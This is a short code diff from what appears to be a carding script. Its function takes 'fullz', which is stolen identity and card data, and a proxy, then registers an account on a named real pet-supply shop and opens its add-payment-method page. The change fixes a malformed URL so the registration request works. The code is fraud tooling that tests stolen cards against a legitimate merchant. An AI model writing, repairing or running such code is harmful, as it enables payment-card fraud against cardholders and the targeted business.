@@ -107,7 +107,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "_wp_http_referer": "/my-account/",
             "register": "Register",
         }
-        await session.post("hhttps://snoopyspetsupplies.ie/my-account", headers=headers, data=data)
+        await session.post("https://snoopyspetsupplies.ie/my-account", headers=headers, data=data)
 
         # STEP 3: add payment page
         response = await session.get("https://snoopyspetsupplies.ie/my-account/add-payment-method/", headers=headers)
